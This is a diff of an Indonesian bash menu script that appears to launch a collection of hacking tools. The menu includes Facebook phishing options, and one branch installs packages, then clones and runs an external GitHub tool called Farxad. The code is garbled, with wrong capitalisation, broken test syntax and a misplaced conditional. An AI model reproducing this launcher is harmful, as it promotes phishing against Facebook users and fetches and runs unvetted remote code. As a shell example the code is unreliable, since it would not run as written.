@@ -44,8 +44,8 @@ echo $i"|"$me"16"$i" |"$cy" PHISING FACEBOOK 3       "$i"|"$i"    |"$cy" K"$i" |
 echo $i"|"$me"17"$i" |"$cy" PHISING FACEBOOK 4       "$i"|"$i"    |"$cy" E"$i" |"
 echo $i"────────────────────────────────"$i"    |"$cy" R"$i" |"
 echo $i"|"$me"18"$i" |"$cy" INSTALL BAHAN DULU COEG  "$i"|"$i"    |"$cy" E"$i" |"
-echo $i"|"$me"19"$i" |"$cy" KELUAR/EXIT PROGRAM      "$i"|"$i"    |"$cy" N"$i" |"
-echo $i"|"$me"20"$i" |"$cy" Farxad                   "$i"|"$i".   |"$cy" E"$i" |"
+echo $i"|"$me"20"$i" |"$cy" KELUAR/EXIT PROGRAM      "$i"|"$i"    |"$cy" N"$i" |"
+echo $i"|"$me"19"$i" |"$cy" Farxad                   "$i"|"$i".   |"$cy" E"$i" |"
 echo $i"────────────────────────────────    ─────"
 echo
 echo $me"┌==="$bi"["$i"FR13ND8"$bi"]"$me"======"$bi"["$i""Pilih Nomornya""$bi"]"
@@ -251,7 +251,7 @@ then
 Clear 
 figlet -f slant "W A I T"|lolcat 
 Sleep 1
-if [ $pil = 20]Pkg update - y
+Pkg update - y
 Pkg upgrade -y
 Pkg install git -y
 Pkg install python -y
@@ -260,7 +260,9 @@ Pip2 install mechanize -y
 Pip2 install requests - y
  git clone https://github.com/RdH4CK3r/Farxad
 cd Farxad
-Python2 farxad.py
+Python2 farxad.py 
+if [ $pil = 20] 
+then
 clear
 figlet -f slant "E X I T"|lolcat
 sleep 2
